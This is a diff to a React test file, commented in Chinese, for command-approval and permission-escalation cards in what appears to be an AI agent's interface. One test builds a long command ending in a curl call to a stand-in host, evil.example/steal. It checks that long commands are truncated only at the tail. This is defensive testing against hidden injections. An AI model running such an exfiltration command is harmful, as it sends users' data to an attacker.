@@ -29,21 +29,26 @@ function approval(over: Partial<ApprovalViewModel> = {}): ApprovalViewModel {
 }
 
 describe('命令审批卡（10 §3.2）', () => {
-  it('显示命令、cwd 与**为什么需要确认**', () => {
-    render(<ApprovalCard approval={approval()} onDecide={() => {}} />);
+  it('先显示影响、范围、原因，命令收在技术详情里', () => {
+    const { container } = render(<ApprovalCard approval={approval()} onDecide={() => {}} />);
+    const text = container.querySelector('.ew-approval-card')?.textContent ?? '';
+    expect(text.indexOf('影响')).toBeLessThan(text.indexOf('范围'));
+    expect(text.indexOf('范围')).toBeLessThan(text.indexOf('原因'));
+    expect(screen.getByText(/目录：~\/work\/weekly/)).toBeTruthy();
+    expect(screen.getByText('这个命令会从网络安装软件包')).toBeTruthy();
+    expect(screen.queryByText(/pip install openpyxl/)).toBeNull();
+    fireEvent.click(screen.getByRole('button', { name: '查看技术详情' }));
     expect(screen.getByText(/pip install openpyxl/)).toBeTruthy();
-    expect(screen.getByText(/在 ~\/work\/weekly/)).toBeTruthy();
-    expect(screen.getByText(/为什么需要确认：这个命令会从网络安装软件包/)).toBeTruthy();
   });
 
   it('**理由缺失时显式说明缺失**，而不是留空（没有理由的审批等于让用户瞎点）', () => {
     // 刻意构造一个没有 reason 的审批：exactOptionalPropertyTypes 下要用删除而不是传 undefined
     const withoutReason = { ...approval() } as Record<string, unknown>;
     delete withoutReason.reason;
-    render(
+    const { container } = render(
       <ApprovalCard approval={withoutReason as unknown as ApprovalViewModel} onDecide={() => {}} />,
     );
-    const text = screen.getByText(/为什么需要确认/).textContent ?? '';
+    const text = container.querySelector('.ew-approval-reason')?.textContent ?? '';
     expect(text).toContain('没有给出理由');
     // 而且要给出建议，不只是说"没有"
     expect(text).toContain('建议先拒绝');
@@ -52,6 +57,7 @@ describe('命令审批卡（10 §3.2）', () => {
   it('命令超长时**只截尾部，绝不省略中间**（中间省略号是注入的最佳藏身处）', () => {
     const long = `python3 -c "${'x'.repeat(300)}" && curl http://evil.example/steal`;
     render(<ApprovalCard approval={approval({ command: long })} onDecide={() => {}} />);
+    fireEvent.click(screen.getByRole('button', { name: '查看技术详情' }));
 
     const shown = screen.getByText(/python3 -c/).textContent ?? '';
     // 尾部被截掉（所以看不到最后那段 curl），而不是中间打省略号
@@ -83,7 +89,7 @@ describe('命令审批卡（10 §3.2）', () => {
 
   it('无障碍：role=alertdialog（10 §8.1）', () => {
     render(<ApprovalCard approval={approval()} onDecide={() => {}} />);
-    expect(screen.getByRole('alertdialog', { name: '需要你确认' })).toBeTruthy();
+    expect(screen.getByRole('alertdialog', { name: '需要你确认' })).toBe(document.activeElement);
   });
 });
 
@@ -156,7 +162,9 @@ describe('权限提升卡（10 §3.4）', () => {
     );
     expect(screen.getByText(/~\/Downloads\/invoices\//)).toBeTruthy();
     expect(screen.getByText(/api.example.com/)).toBeTruthy();
-    expect(screen.getByText(/用途：读取你提到的发票文件/)).toBeTruthy();
+    expect(document.querySelector('.ew-approval-reason')?.textContent).toContain(
+      '读取你提到的发票文件并调用汇率接口',
+    );
 
     // 第一个动作按钮是"允许这一次"（范围最小化，10 §3.4）
     const buttons = screen.getAllByRole('button');
